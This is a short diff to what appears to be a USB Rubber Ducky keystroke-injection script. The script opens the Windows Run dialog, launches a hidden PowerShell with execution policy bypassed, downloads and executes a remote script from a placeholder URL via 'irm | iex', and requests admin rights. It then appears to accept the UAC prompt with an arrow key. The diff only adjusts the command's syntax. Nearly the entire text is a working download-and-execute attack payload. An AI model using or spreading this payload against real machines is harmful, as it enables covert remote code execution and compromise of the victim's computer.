@@ -40,10 +40,12 @@ EXTENSION PASSIVE_WINDOWS_DETECT
         END_IF
     END_REM
 END_EXTENSION
+
 DEFINE #MY_TARGET_URL example.com
+
 GUI r
 DELAY 500
-STRINGLN powershell.exe start powershell -argumentlist '-noexit -windowstyle hidden -exec bypass irm #MY_TARGET_URL|iex' -verb runas
+STRINGLN powershell.exe start powershell -a '-noexit -windowstyle hidden -exec bypass -c "irm #MY_TARGET_URL|iex"' -v runas
 DELAY 3000
 LEFTARROW
 DELAY 75
